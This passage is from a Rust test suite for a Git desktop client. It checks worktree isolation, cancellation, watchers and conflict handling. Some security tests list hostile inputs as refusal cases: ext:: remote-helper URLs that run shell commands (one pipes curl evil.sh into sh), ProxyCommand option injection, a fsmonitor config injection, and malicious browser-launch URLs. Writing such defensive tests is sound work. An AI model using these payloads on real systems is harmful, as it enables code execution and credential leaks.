        let started = Instant::now();
        let result = exec_on(&repo, scope_lock, &call, None, cancel);
        let elapsed = started.elapsed();

        let stash_list_after = git(&["stash", "list"]);
        let _ = fs::remove_dir_all(&dir);

        assert_eq!(result.unwrap_err(), "Cancelled");
        assert!(
            elapsed < Duration::from_secs(1),
            "cancellation while waiting for the lock must not wait for the lock to \
             free up; took {elapsed:?}"
        );
        // `git` returns true/false for success in this fixture's closure, not stash
        // output -- the real assertion is that `exec_on` never got far enough to run
        // `git stash push` at all, which the fast, immediate Cancelled result above
        // already proves (it never touched the held lock).
        let _ = stash_list_after;
    }

    #[test]
    fn register_job_returns_a_fresh_unset_flag_and_reuses_it_on_a_second_call() {
        let jobs = GitJobs::default();
        let flag = register_job(&jobs, "op-1", "/work").unwrap();
        assert!(!flag.load(Ordering::Relaxed));

        // The same id registering again (e.g. a stale retry) gets the same flag, not
        // a fresh one that would forget an already-in-flight cancellation.
        let same_flag = register_job(&jobs, "op-1", "/work").unwrap();
        flag.store(true, Ordering::Relaxed);
        assert!(same_flag.load(Ordering::Relaxed));
    }

    #[test]
    fn cancel_jobs_for_repo_only_cancels_jobs_registered_against_that_repository() {
        let jobs = GitJobs::default();
        let flag_a = register_job(&jobs, "op-a", "/work-a").unwrap();
        let flag_b = register_job(&jobs, "op-b", "/work-b").unwrap();
        cancel_jobs_for_repo(&jobs, "/work-a").unwrap();
        assert!(flag_a.load(Ordering::Relaxed));
        assert!(!flag_b.load(Ordering::Relaxed));
    }

    #[test]
    fn job_guard_removes_its_entry_on_drop() {
        let jobs = GitJobs::default();
        register_job(&jobs, "op-1", "/work").unwrap();
        assert!(jobs.0.lock().unwrap().contains_key("op-1"));
        {
            let _guard = JobGuard {
                jobs: &jobs,
                id: "op-1".to_string(),
            };
        }
        assert!(
            !jobs.0.lock().unwrap().contains_key("op-1"),
            "the entry must be gone once the guard drops, without a manual removal call"
        );
    }

    /// A main worktree plus one linked worktree, sharing two already-committed
    /// tracked files (`a.txt`, `b.txt`) and a third branch ("elsewhere") that is
    /// never checked out anywhere -- everything Section H.1's execution-context
    /// proof needs, built once so each assertion below stays about the invariant,
    /// not fixture plumbing.
    fn fixture_for_execution_context_proof() -> (PathBuf, PathBuf, Repo, Repo) {
        let (dir, git) = fixture();
        fs::write(dir.join("b.txt"), "base\n").unwrap();
        assert!(git(&["add", "b.txt"]));
        assert!(git(&["commit", "-qm", "add b.txt"]));
        assert!(git(&["branch", "elsewhere"]));

        let linked = temp_dir();
        assert!(git(&[
            "worktree",
            "add",
            linked.to_str().unwrap(),
            "-b",
            "linked-worktree",
        ]));

        // Unique, non-overlapping uncommitted changes: main only touches a.txt,
        // the linked worktree only touches b.txt.
        fs::write(dir.join("a.txt"), "changed in main\n").unwrap();
        fs::write(linked.join("b.txt"), "changed in linked\n").unwrap();

        let main_repo = open(&dir);
        let linked_repo = open(&linked);
        assert_eq!(
            main_repo.repository_id, linked_repo.repository_id,
            "both worktrees must share one repository identity for this proof to \
             mean anything"
        );
        (dir, linked, main_repo, linked_repo)
    }

    #[test]
    fn a_command_never_executes_against_a_worktree_other_than_the_one_it_was_issued_for() {
        let (dir, linked, main_repo, linked_repo) = fixture_for_execution_context_proof();

        let status_args = args(&["status", "--porcelain=v1", "-z", "-uall"]);
        let diff_args = |file: &str| {
            args(&[
                "diff",
                "--no-ext-diff",
                "--no-textconv",
                "--no-color",
                "--",
                file,
            ])
        };
        let branch_args = args(&["symbolic-ref", "--short", "HEAD"]);
        let head_args = args(&["rev-parse", "HEAD"]);

        // 1. status only reports the change actually made in that worktree.
        let status_main = exec(&main_repo, &status_args, None).unwrap();
        let status_linked = exec(&linked_repo, &status_args, None).unwrap();
        assert!(status_main.stdout.contains("a.txt"));
        assert!(!status_main.stdout.contains("b.txt"));
        assert!(status_linked.stdout.contains("b.txt"));
        assert!(!status_linked.stdout.contains("a.txt"));

        // 2. diff only shows that worktree's own uncommitted content change.
        let diff_main = exec(&main_repo, &diff_args("a.txt"), None).unwrap();
        let diff_linked = exec(&linked_repo, &diff_args("b.txt"), None).unwrap();
        assert!(diff_main.stdout.contains("changed in main"));
        assert!(!diff_main.stdout.contains("changed in linked"));
        assert!(diff_linked.stdout.contains("changed in linked"));
        assert!(!diff_linked.stdout.contains("changed in main"));

        // 3. staging + committing in main advances only main's HEAD, and never
        // disturbs the linked worktree's own still-uncommitted change.
        let linked_head_before = exec(&linked_repo, &head_args, None).unwrap().stdout;
        let main_head_before = exec(&main_repo, &head_args, None).unwrap().stdout;
        exec(&main_repo, &args(&["add", "a.txt"]), None).unwrap();
        exec(
            &main_repo,
            &args(&["commit", "-m", "commit from main"]),
            None,
        )
        .unwrap();
        let main_head_after = exec(&main_repo, &head_args, None).unwrap().stdout;
        let linked_head_after = exec(&linked_repo, &head_args, None).unwrap().stdout;
        let linked_diff_after = exec(&linked_repo, &diff_args("b.txt"), None).unwrap();
        assert_ne!(
            main_head_before, main_head_after,
            "committing in main must move main's own HEAD"
        );
        assert_eq!(
            linked_head_before, linked_head_after,
            "committing in main must never move the linked worktree's HEAD"
        );
        assert!(
            linked_diff_after.stdout.contains("changed in linked"),
            "the linked worktree's own uncommitted change must survive a commit \
             made in a different worktree"
        );

        // 4. switching main to a branch checked out nowhere else changes only
        // main's own current branch.
        let linked_branch_before = exec(&linked_repo, &branch_args, None).unwrap().stdout;
        exec(&main_repo, &args(&["switch", "elsewhere"]), None).unwrap();
        let main_branch_after = exec(&main_repo, &branch_args, None).unwrap().stdout;
        let linked_branch_after = exec(&linked_repo, &branch_args, None).unwrap().stdout;
        assert_eq!(main_branch_after.trim(), "elsewhere");
        assert_eq!(
            linked_branch_before, linked_branch_after,
            "switching main's branch must never change the linked worktree's \
             current branch"
        );

        let _ = fs::remove_dir_all(&linked);
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_git_operation_cancelled_through_the_real_job_registry_is_actually_stopped() {
        let (dir, _git) = fixture();
        let repository_id = discover_common_dir(&dir)
            .map(|p| clean_path_str(&p))
            .unwrap();
        let jobs = GitJobs::default();
        // The exact flag `git_exec` would register and `git_cancel_repo` would flip.
        let cancel = register_job(&jobs, "op-1", &repository_id).unwrap();
        assert!(
            !jobs.0.lock().unwrap().is_empty(),
            "sanity: the job was registered"
        );

        let flag = cancel.clone();
        let repository_id_for_cancel = repository_id.clone();
        std::thread::spawn(move || {
            std::thread::sleep(Duration::from_millis(100));
            cancel_jobs_for_repo(&jobs, &repository_id_for_cancel).unwrap();
        });

        // A long-running command in the same shape `run_command` spawns internally
        // (via `capture`), so this exercises real process termination end-to-end,
        // through the exact flag the job registry hands out.
        let mut sleepy = Command::new("cmd");
        sleepy.args(["/C", "timeout", "/t", "30"]);
        let started = Instant::now();
        let result = capture(sleepy, None, flag);
        let elapsed = started.elapsed();

        let _ = fs::remove_dir_all(&dir);

        assert_eq!(result.unwrap_err(), "Cancelled");
        assert!(
            elapsed < Duration::from_secs(5),
            "took {elapsed:?} -- cancellation through the real job registry must stop \
             the process promptly, not wait for it to run its full course"
        );
    }

    /// A `Repos` map containing every worktree returned by
    /// `fixture_with_two_linked_worktrees`, keyed exactly like `register_repo`
    /// would key them -- what `watch_repo` needs to resolve `worktree_repo_ids`
    /// into real worktree roots.
    fn repos_for(worktrees: &[&Repo]) -> Repos {
        let repos = Repos::default();
        let mut guard = repos.0.lock().unwrap();
        for repo in worktrees {
            guard.insert(
                clean_path_str(&repo.root),
                Arc::new(Repo {
                    root: repo.root.clone(),
                    repository_id: repo.repository_id.clone(),
                    lock: Mutex::new(()),
                    git_dir: OnceLock::new(),
                }),
            );
        }
        drop(guard);
        repos
    }

    #[test]
    fn watch_repo_reports_correctly_classified_and_attributed_events() {
        let (dir, repo_a, repo_b) = fixture_with_two_linked_worktrees();
        let repos = repos_for(&[&repo_a, &repo_b]);
        let watches = GitWatches::default();
        let events: Arc<std::sync::Mutex<Vec<GitChangeEvent>>> =
            Arc::new(std::sync::Mutex::new(Vec::new()));
        let collected = Arc::clone(&events);

        tauri::async_runtime::block_on(watch_repo(
            &repos,
            &watches,
            move |event| collected.lock().unwrap().push(event),
            repo_a.repository_id.clone(),
            vec![clean_path_str(&repo_a.root), clean_path_str(&repo_b.root)],
        ))
        .unwrap();

        // The same lookup `watch_repo` itself does internally, to find the exact
        // paths a real Git action against worktree A would touch -- not guessed.
        let common_dir = PathBuf::from(&repo_a.repository_id);
        let a_gitdir = PathBuf::from(
            run(&repo_a.root, &["rev-parse", "--absolute-git-dir"])
                .unwrap()
                .stdout
                .trim(),
        );

        // A repository-shared change (a new local branch, visible from every
        // worktree's shared common dir) ...
        std::fs::write(common_dir.join("refs/heads/from-outside"), "abc123\n").unwrap();
        // ... and a per-worktree change (A's own HEAD moving) -- bypassing `git`
        // itself (a raw file write, not `git switch`) to isolate the watcher from
        // any other side effect, matching `watcher.rs`'s own test convention.
        std::fs::write(a_gitdir.join("HEAD"), "ref: refs/heads/from-outside\n").unwrap();
        std::thread::sleep(Duration::from_millis(300 * 4));

        watches.0.lock().unwrap().remove(&repo_a.repository_id);
        let seen = events.lock().unwrap().clone();
        let _ = fs::remove_dir_all(&repo_a.root);
        let _ = fs::remove_dir_all(&repo_b.root);
        let _ = fs::remove_dir_all(&dir);

        assert!(
            seen.iter()
                .any(|e| e.kind == "refs" && e.worktree_root.is_none()),
            "expected an unattributed repository-shared 'refs' event, got {seen:?}"
        );
        assert!(
            seen.iter().any(|e| e.kind == "head"
                && e.worktree_root.as_deref() == Some(&clean_path_str(&repo_a.root))),
            "expected a 'head' event attributed to worktree A's own root, got {seen:?}"
        );
    }

    #[test]
    fn unwatching_a_repository_stops_further_events() {
        let (dir, _git) = fixture();
        let repository_id = discover_common_dir(&dir)
            .map(|p| clean_path_str(&p))
            .unwrap();
        let repo = Repo {
            root: dir.clone(),
            repository_id: repository_id.clone(),
            lock: Mutex::new(()),
            git_dir: OnceLock::new(),
        };
        let repos = repos_for(&[&repo]);
        let watches = GitWatches::default();
        let events: Arc<std::sync::Mutex<Vec<GitChangeEvent>>> =
            Arc::new(std::sync::Mutex::new(Vec::new()));
        let collected = Arc::clone(&events);

        tauri::async_runtime::block_on(watch_repo(
            &repos,
            &watches,
            move |event| collected.lock().unwrap().push(event),
            repository_id.clone(),
            vec![clean_path_str(&dir)],
        ))
        .unwrap();
        assert!(watches.0.lock().unwrap().contains_key(&repository_id));

        let common_dir = PathBuf::from(&repository_id);
        std::fs::write(common_dir.join("refs/heads/before-unwatch"), "abc\n").unwrap();
        std::thread::sleep(Duration::from_millis(300 * 3));
        let before = events.lock().unwrap().len();
        assert!(
            before > 0,
            "sanity: the watcher must have reported something before unwatching"
        );

        // Exactly what git_unwatch_repo does -- dropping the map entry drops (and so
        // stops) the underlying RecommendedWatcher. A brief grace period covers the
        // OS's own, not-necessarily-instantaneous unregistration (observed: a write
        // issued immediately after drop() can still straggle in on some backends).
        watches.0.lock().unwrap().remove(&repository_id);
        std::thread::sleep(Duration::from_millis(100));

        std::fs::write(common_dir.join("refs/heads/after-unwatch"), "def\n").unwrap();
        std::thread::sleep(Duration::from_millis(300 * 3));
        let after_first = events.lock().unwrap().len();
        // A second post-unwatch write, further separated in time, must show no
        // further growth -- distinguishing "truly stopped" from "one straggling
        // event from an in-flight OS notification at the moment of the drop".
        std::fs::write(common_dir.join("refs/heads/after-unwatch-2"), "ghi\n").unwrap();
        std::thread::sleep(Duration::from_millis(300 * 3));
        let after = events.lock().unwrap().len();

        let _ = fs::remove_dir_all(&dir);

        assert_eq!(
            after, after_first,
            "a second write, well after unwatching, must never add a further event"
        );
    }

    #[test]
    fn a_staged_rename_with_a_content_change_diffs_as_a_compact_rename_not_a_full_add() {
        let (dir, git) = fixture();
        let repo = open(&dir);

        std::fs::write(dir.join("a.txt"), "line1\nline2\nline3\nline4\nline5\n").unwrap();
        assert!(git(&["add", "a.txt"]));
        assert!(git(&["commit", "-qm", "five lines"]));
        assert!(git(&["mv", "a.txt", "b.txt"]));
        std::fs::write(
            dir.join("b.txt"),
            "line1\nline2-changed\nline3\nline4\nline5\n",
        )
        .unwrap();
        assert!(git(&["add", "b.txt"]));

        // -M must be permitted by the allow-list, and both the old and new path
        // must be passed as pathspecs together for Git to recognize the rename
        // relationship (Module 5 Section B/D's verified fix).
        let output = exec(
            &repo,
            &args(&[
                "diff",
                "--no-ext-diff",
                "--no-textconv",
                "--no-color",
                "-M",
                "--cached",
                "--",
                "b.txt",
                "a.txt",
            ]),
            None,
        )
        .unwrap();
        let _ = fs::remove_dir_all(&dir);

        assert!(
            output.stdout.contains("rename from a.txt")
                && output.stdout.contains("rename to b.txt"),
            "expected a rename diff, got: {}",
            output.stdout
        );
        assert!(
            !output.stdout.contains("new file mode"),
            "must not be reported as a brand-new file: {}",
            output.stdout
        );
        assert!(
            output.stdout.contains("-line2") && output.stdout.contains("+line2-changed"),
            "expected only the single changed line, got: {}",
            output.stdout
        );
        assert!(
            !output.stdout.contains("+line1\n"),
            "unchanged lines must not appear as additions: {}",
            output.stdout
        );
    }

    #[test]
    fn remote_head_is_readable_locally_once_set_and_a_clean_failure_before_then() {
        let bare = temp_dir();
        fs::create_dir_all(&bare).unwrap();
        assert!(Command::new("git")
            .current_dir(&bare)
            .args(["init", "-q", "--bare"])
            .status()
            .unwrap()
            .success());
        let (dir, git) = fixture();
        let repo = open(&dir);
        let remote_url = clean_path_str(&bare);
        assert!(git(&["remote", "add", "origin", &remote_url]));
        assert!(git(&["push", "-q", "origin", "HEAD:main"]));

        // Before `remote set-head` ever runs, refs/remotes/origin/HEAD does not exist --
        // this must be a clean, non-panicking failure, not a crash.
        let before = exec(
            &repo,
            &args(&["symbolic-ref", "refs/remotes/origin/HEAD"]),
            None,
        )
        .unwrap();
        assert_ne!(before.code, 0, "must fail cleanly before HEAD is ever set");

        assert!(git(&["remote", "set-head", "origin", "main"]));
        let after = exec(
            &repo,
            &args(&["symbolic-ref", "refs/remotes/origin/HEAD"]),
            None,
        )
        .unwrap();
        let _ = fs::remove_dir_all(&dir);
        let _ = fs::remove_dir_all(&bare);

        assert_eq!(after.code, 0);
        assert_eq!(after.stdout.trim(), "refs/remotes/origin/main");
    }

    /// The `ext::` remote helper turns "store this URL" into "run this command on the next
    /// fetch". Git itself accepts such a URL happily, so this boundary is the only thing
    /// standing between a free-text remote URL and arbitrary code execution -- assert both
    /// halves, so a future relaxation of the URL check cannot quietly reopen it.
    #[test]
    fn a_remote_helper_url_is_refused_and_git_itself_would_have_accepted_it() {
        let (dir, git) = fixture();
        let repo = open(&dir);
        const HELPER_URL: &str = "ext::sh -c touch% pwned";

        let refused = exec(&repo, &args(&["remote", "add", "pwn", HELPER_URL]), None);
        assert!(
            refused.is_err(),
            "storing an ext:: remote helper URL must be refused at the IPC boundary"
        );

        // Load-bearing check: Git has no objection of its own, so the refusal above is the
        // whole defense rather than a redundant second opinion.
        assert!(
            git(&["remote", "add", "pwn", HELPER_URL]),
            "git accepts this URL, which is exactly why Yavin must not pass it through"
        );
        let stored = exec(&repo, &args(&["remote", "get-url", "pwn"]), None).unwrap();
        let _ = fs::remove_dir_all(&dir);
        assert_eq!(stored.stdout.trim(), HELPER_URL);
    }

    #[test]
    fn cloning_produces_a_usable_work_tree_and_refuses_unsafe_urls_and_names() {
        let (source, git) = fixture();
        assert!(git(&["branch", "-M", "main"]));
        let parent = temp_dir();
        fs::create_dir_all(&parent).unwrap();
        let source_url = clean_path_str(&source);

        let cloned = clone_repository(&parent, &source_url, "checkout").unwrap();
        assert!(cloned.join(".git").exists(), "clone must be a work tree");
        // It is a real repository the rest of the app can address, not just a folder.
        let log = run(&cloned, &["log", "--oneline"]).unwrap();
        assert_eq!(log.code, 0);

        // A second clone into the same name must not silently overwrite the first.
        assert!(clone_repository(&parent, &source_url, "checkout").is_err());
        // A remote helper URL is refused here exactly as `remote add` refuses it.
        assert!(clone_repository(&parent, "ext::sh -c touch% pwned", "x").is_err());
        // The folder is a name inside the picked directory, never a path out of it.
        for bad_name in ["../escape", "a/b", "a\\b", "", "-x", ".", ".."] {
            assert!(
                clone_repository(&parent, &source_url, bad_name).is_err(),
                "folder name must be refused: {bad_name}"
            );
        }
        assert!(!parent.join("..").join("escape").exists());

        let _ = fs::remove_dir_all(&source);
        let _ = fs::remove_dir_all(&parent);
    }

    #[test]
    fn remote_urls_accept_every_real_transport_and_refuse_helpers_and_option_hosts() {
        for good in [
            "https://github.com/owner/repo.git",
            "https://user:token@github.com/owner/repo.git",
            "http://internal.test/r.git",
            "ssh://git@github.com/owner/repo.git",
            "ssh://git@github.com:2222/owner/repo.git",
            "git://example.com/r.git",
            "file:///srv/git/r.git",
            "git@github.com:owner/repo.git",
            "/srv/git/sibling",
            "../sibling-clone",
            "C:\\repos\\sibling",
            "\\\\fileserver\\share\\repo.git",
        ] {
            assert!(is_safe_remote_url(good), "should be accepted: {good}");
        }
        for bad in [
            "",
            "ext::sh -c 'curl evil.sh|sh'",
            "ext::sh -c touch pwned",
            "fd::7,8",
            "transport::address",
            "-oProxyCommand=sh",
            "--upload-pack=sh",
            "ssh://-oProxyCommand=sh/x",
            "ssh://user@-badhost/x",
            "unknownscheme://host/x",
            "https://ok.test/r.git\n[core]\nfsmonitor = sh",
            "https://",
            "ssh://",
        ] {
            assert!(!is_safe_remote_url(bad), "should be refused: {bad}");
        }
    }

    #[test]
    fn only_a_plain_https_url_can_be_handed_to_the_os_browser_launcher() {
        for good in [
            "https://github.com/owner/repo/commit/abc123",
            "https://git.example.com:8443/o/r/commit/abc",
            "https://host.test/path?query=1#frag",
        ] {
            assert!(is_openable_web_url(good), "should be openable: {good}");
        }
        for bad in [
            "",
            "http://github.com/x",
            "file:///etc/passwd",
            "javascript:alert(1)",
            "https://",
            // explorer.exe has historically split on commas, which would open a second,
            // attacker-chosen target -- here a UNC path (NTLM leak / program launch).
            "https://ok.test/x,\\\\10.0.0.1\\share\\evil.exe",
            "https://ok.test/x\\..\\..\\evil",
            "https://ok.test/a b",
            "https://ok.test/x\nhttps://evil.test",
            "https://ok.test/\"quoted\"",
            "https://-badhost/x",
        ] {
            assert!(!is_openable_web_url(bad), "should be refused: {bad}");
        }
        // Length is bounded so a pathological URL cannot be handed to the launcher.
        assert!(!is_openable_web_url(&format!(
            "https://ok.test/{}",
            "a".repeat(4096)
        )));
    }

    #[test]
    fn deleting_a_branch_checked_out_in_another_worktree_is_refused_even_with_force() {
        let (dir, repo_a, _repo_b) = fixture_with_two_linked_worktrees();
        // From the main worktree, try to delete the branch checked out in the linked
        // "worktree-a" -- Git must refuse this unconditionally, even with -D.
        let safe = exec(&repo_a, &args(&["branch", "-d", "worktree-b"]), None);
        let force = exec(&repo_a, &args(&["branch", "-D", "worktree-b"]), None);
        let _ = fs::remove_dir_all(&dir);

        let safe = safe.unwrap();
        let force = force.unwrap();
        assert_ne!(safe.code, 0);
        assert!(safe.stderr.contains("used by worktree"), "{}", safe.stderr);
        assert_ne!(force.code, 0, "force delete must not bypass this refusal");
        assert!(
            force.stderr.contains("used by worktree"),
            "{}",
            force.stderr
        );
    }

    #[test]
    fn deleting_the_current_worktrees_own_branch_is_refused_the_same_way() {
        let (dir, git) = fixture();
        let repo = open(&dir);
        assert!(git(&["switch", "-qc", "onlybranch"]));

        let result = exec(&repo, &args(&["branch", "-d", "onlybranch"]), None).unwrap();
        let _ = fs::remove_dir_all(&dir);

        assert_ne!(result.code, 0);
        assert!(
            result.stderr.contains("used by worktree"),
            "deleting the current worktree's own checked-out branch must fail with the \
             same 'used by worktree' error family as deleting one checked out \
             elsewhere -- verified empirically, not a distinct restriction: {}",
            result.stderr
        );
    }

    #[test]
    fn deleting_an_unmerged_branch_requires_force_and_a_bare_delete_refuses_cleanly() {
        let (dir, git) = fixture();
        let repo = open(&dir);
        assert!(git(&["switch", "-qc", "other"]));
        fs::write(dir.join("a.txt"), "unmerged change\n").unwrap();
        assert!(git(&["add", "a.txt"]));
        assert!(git(&["commit", "-qm", "unmerged"]));
        assert!(git(&["switch", "-q", "-"]));

        let safe = exec(&repo, &args(&["branch", "-d", "other"]), None).unwrap();
        assert_ne!(safe.code, 0);
        assert!(safe.stderr.contains("not fully merged"), "{}", safe.stderr);

        let force = exec(&repo, &args(&["branch", "-D", "other"]), None).unwrap();
        let _ = fs::remove_dir_all(&dir);
        assert_eq!(force.code, 0, "force delete must succeed: {}", force.stderr);
    }

    #[test]
    fn an_unrelated_branch_flag_is_rejected() {
        let (dir, _git) = fixture();
        let repo = open(&dir);
        let result = exec(&repo, &args(&["branch", "--move", "renamed"]), None);
        let _ = fs::remove_dir_all(&dir);
        let error = result.unwrap_err();
        assert!(error.contains("not permitted"), "unexpected error: {error}");
    }

    #[test]
    fn fetch_prune_is_reachable_and_removes_a_stale_remote_tracking_branch() {
        let bare = temp_dir();
        fs::create_dir_all(&bare).unwrap();
        assert!(Command::new("git")
            .current_dir(&bare)
            .args(["init", "-q", "--bare"])
            .status()
            .unwrap()
            .success());
        let (dir, git) = fixture();
        let repo = open(&dir);
        let remote_url = clean_path_str(&bare);
        assert!(git(&["remote", "add", "origin", &remote_url]));
        assert!(git(&["push", "-q", "origin", "HEAD:main"]));
        assert!(git(&["push", "-q", "origin", "HEAD:doomed"]));
        assert!(git(&["fetch", "-q", "origin"]));
        assert!(git(&[
            "show-ref",
            "--verify",
            "-q",
            "refs/remotes/origin/doomed"
        ]));

        // Delete the branch on the "remote" directly (bypassing Yavin, simulating an
        // external deletion), then confirm a plain fetch (no --prune) leaves the
        // stale remote-tracking ref behind, and fetch --prune removes it.
        assert!(Command::new("git")
            .current_dir(&bare)
            .args(["branch", "-D", "doomed"])
            .status()
            .unwrap()
            .success());
        let plain = exec(&repo, &args(&["fetch"]), None).unwrap();
        assert_eq!(plain.code, 0);
        assert!(git(&[
            "show-ref",
            "--verify",
            "-q",
            "refs/remotes/origin/doomed"
        ]));

        let pruned = exec(&repo, &args(&["fetch", "--prune"]), None).unwrap();
        let still_present = Command::new("git")
            .current_dir(&dir)
            .args(["show-ref", "--verify", "-q", "refs/remotes/origin/doomed"])
            .status()
            .unwrap()
            .success();
        let _ = fs::remove_dir_all(&dir);
        let _ = fs::remove_dir_all(&bare);

        assert_eq!(
            pruned.code, 0,
            "fetch --prune must succeed: {}",
            pruned.stderr
        );
        assert!(
            !still_present,
            "fetch --prune must remove the stale remote-tracking ref"
        );
    }

    #[test]
    fn an_unrelated_fetch_flag_is_rejected() {
        let (dir, _git) = fixture();
        let repo = open(&dir);
        let result = exec(&repo, &args(&["fetch", "--tags"]), None);
        let _ = fs::remove_dir_all(&dir);
        let error = result.unwrap_err();
        assert!(error.contains("not permitted"), "unexpected error: {error}");
    }

    #[test]
    fn a_rebase_conflict_can_be_skipped_advancing_to_the_next_commit() {
        let (dir, git) = fixture();
        assert!(git(&["branch", "feature"]));
        assert!(git(&["switch", "-q", "feature"]));
        fs::write(dir.join("a.txt"), "feat1\n").unwrap();
        assert!(git(&["commit", "-qam", "feat1"]));
        assert!(git(&["switch", "-q", "-"]));
        fs::write(dir.join("a.txt"), "m1\n").unwrap();
        assert!(git(&["commit", "-qam", "m1"]));
        fs::write(dir.join("a.txt"), "m2\n").unwrap();
        assert!(git(&["commit", "-qam", "m2"]));

        // Two commits to rebase onto "feature", both conflicting.
        assert!(!git(&["rebase", "feature"]));
        let repo = open(&dir);
        let during_round1 = repo_state(&repo).unwrap();
        let gitdir = dir.join(".git");
        let msgnum_round1 = fs::read_to_string(gitdir.join("rebase-merge/msgnum")).unwrap();
        let end = fs::read_to_string(gitdir.join("rebase-merge/end")).unwrap();

        let skip = exec(&repo, &args(&["rebase", "--skip"]), None);
        let during_round2 = repo_state(&repo).unwrap();
        let msgnum_round2 = fs::read_to_string(gitdir.join("rebase-merge/msgnum")).unwrap();
        let abort = exec(&repo, &args(&["rebase", "--abort"]), None);
        let after = repo_state(&repo).unwrap();
        let _ = fs::remove_dir_all(&dir);

        assert_eq!(during_round1, "rebase");
        assert_eq!(msgnum_round1.trim(), "1");
        assert_eq!(end.trim(), "2");
        assert!(skip.is_ok(), "skip failed: {:?}", skip.err());
        assert_eq!(
            during_round2, "rebase",
            "the rebase must still be in progress on its second, still-conflicting commit"
        );
        assert_eq!(
            msgnum_round2.trim(),
            "2",
            "skip must advance the sequencer to the next commit"
        );
        assert!(abort.is_ok());
        assert_eq!(after, "");
    }

    #[test]
    fn a_cherry_pick_conflict_can_be_skipped_and_cherry_pick_head_persists_across_it() {
        let (dir, git) = fixture();
        fs::write(dir.join("a.txt"), "c1\n").unwrap();
        assert!(git(&["commit", "-qam", "c1"]));
        fs::write(dir.join("a.txt"), "c2\n").unwrap();
        assert!(git(&["commit", "-qam", "c2"]));
        assert!(git(&["switch", "-qc", "other", "HEAD~2"]));
        fs::write(dir.join("a.txt"), "other1\n").unwrap();
        assert!(git(&["commit", "-qam", "other1"]));

        assert!(!git(&["cherry-pick", "master~1", "master"]));
        let repo = open(&dir);
        let during_round1 = repo_state(&repo).unwrap();
        let gitdir = dir.join(".git");
        let head_round1 = fs::read_to_string(gitdir.join("CHERRY_PICK_HEAD")).unwrap();
        let todo_round1 = fs::read_to_string(gitdir.join("sequencer/todo")).unwrap();

        let skip = exec(&repo, &args(&["cherry-pick", "--skip"]), None);
        let during_round2 = repo_state(&repo).unwrap();
        let head_round2 = fs::read_to_string(gitdir.join("CHERRY_PICK_HEAD")).unwrap();
        let abort = exec(&repo, &args(&["cherry-pick", "--abort"]), None);
        let after = repo_state(&repo).unwrap();
        let _ = fs::remove_dir_all(&dir);

        assert_eq!(during_round1, "cherry-pick");
        assert!(todo_round1.contains("pick"));
        assert!(skip.is_ok(), "skip failed: {:?}", skip.err());
        assert_eq!(
            during_round2, "cherry-pick",
            "CHERRY_PICK_HEAD must still be present for the second commit"
        );
        assert_ne!(
            head_round1, head_round2,
            "the marker must now point at the next (second) commit"
        );
        assert!(abort.is_ok());
        assert_eq!(after, "");
    }

    #[test]
    fn a_merge_conflict_is_correctly_isolated_from_a_sibling_worktrees_own_state() {
        let (dir, repo_a, repo_b) = fixture_with_two_linked_worktrees();
        // Deliberately conflict A against its OWN prior commit on worktree-a's branch,
        // not against worktree-b's branch -- Git's worktree-exclusivity guarantee
        // (already established) means A can never merge B's own checked-out branch
        // directly, so this fixture merges a third, unrelated ref into A instead.
        let root_a = repo_a.root.clone();
        assert!(Command::new("git")
            .current_dir(&root_a)
            .args(["switch", "-qc", "conflict-source", "HEAD~0"])
            .status()
            .unwrap()
            .success());
        fs::write(root_a.join("a.txt"), "conflict\n").unwrap();
        assert!(Command::new("git")
            .current_dir(&root_a)
            .args(["commit", "-qam", "conflict"])
            .status()
            .unwrap()
            .success());
        assert!(Command::new("git")
            .current_dir(&root_a)
            .args(["switch", "-q", "worktree-a"])
            .status()
            .unwrap()
            .success());
        fs::write(root_a.join("a.txt"), "other-side\n").unwrap();
        assert!(Command::new("git")
            .current_dir(&root_a)
            .args(["commit", "-qam", "other-side"])
            .status()
            .unwrap()
            .success());
        assert!(!Command::new("git")
            .current_dir(&root_a)
            .args(["merge", "conflict-source"])
            .status()
            .unwrap()
            .success());

        let state_a = repo_state(&repo_a).unwrap();
        let state_b = repo_state(&repo_b).unwrap();
        let _ = Command::new("git")
            .current_dir(&root_a)
            .args(["merge", "--abort"])
            .status();
        let _ = fs::remove_dir_all(&dir);

        assert_eq!(state_a, "merge");
        assert_eq!(
            state_b, "",
            "a merge conflict in worktree A must never appear as a merge in worktree B"
        );
    }

    #[test]
    fn attempting_continue_before_resolving_a_conflict_is_refused_cleanly() {
        let (dir, git) = fixture();
        let repo = open(&dir);
        assert!(git(&["branch", "other"]));
        assert!(git(&["switch", "-q", "other"]));
        fs::write(dir.join("a.txt"), "theirs\n").unwrap();
        assert!(git(&["commit", "-qam", "theirs"]));
        assert!(git(&["switch", "-q", "-"]));
        fs::write(dir.join("a.txt"), "ours\n").unwrap();
        assert!(git(&["commit", "-qam", "ours"]));
        assert!(!git(&["merge", "other"]));

        let result = exec(&repo, &args(&["merge", "--continue"]), None).unwrap();
        let abort = exec(&repo, &args(&["merge", "--abort"]), None);
        let _ = fs::remove_dir_all(&dir);

        assert_ne!(result.code, 0);
        assert!(
            result.stderr.contains("unmerged files") || result.stderr.contains("needs merge"),
            "unexpected refusal text: {}",
            result.stderr
        );
        assert!(abort.is_ok());
    }

    #[test]
    fn starting_an_operation_while_one_is_unresolved_is_refused_by_git_itself() {
        let (dir, git) = fixture();
        let repo = open(&dir);
        // Two branches change the same line differently, so cherry-picking one onto the
        // other is guaranteed to conflict and leave a real, unresolved CHERRY_PICK_HEAD --
        // not just a nonzero exit for some unrelated reason.
        assert!(git(&["switch", "-qc", "feature"]));
        fs::write(dir.join("a.txt"), "feature change\n").unwrap();
        assert!(git(&["commit", "-qam", "feature change"]));
        assert!(git(&["switch", "-q", "master"]));
        fs::write(dir.join("a.txt"), "master change\n").unwrap();
        assert!(git(&["commit", "-qam", "master change"]));

        assert!(!git(&["cherry-pick", "feature"]));
        assert!(
            dir.join(".git/CHERRY_PICK_HEAD").exists(),
            "sanity: the cherry-pick must have actually conflicted, not merely failed"
        );
        // The IPC boundary now permits *starting* a merge/rebase against a plain branch name
        // (validate_shape's "merge" | "rebase" arm, for "Merge…"/"Rebase Branch…") -- but Git
        // itself still refuses to start a second operation while a cherry-pick is unresolved,
        // a protection that was never the IPC boundary's job to provide.
        let result = exec(&repo, &args(&["merge", "feature"]), None);
        let abort = exec(&repo, &args(&["cherry-pick", "--abort"]), None);
        let _ = fs::remove_dir_all(&dir);

        // The IPC boundary itself accepts the shape (`result` is `Ok`, a spawned process);
        // git's own exit code is what refuses it -- the same layering `Repository.run` (TS)
        // already relies on for every other command.
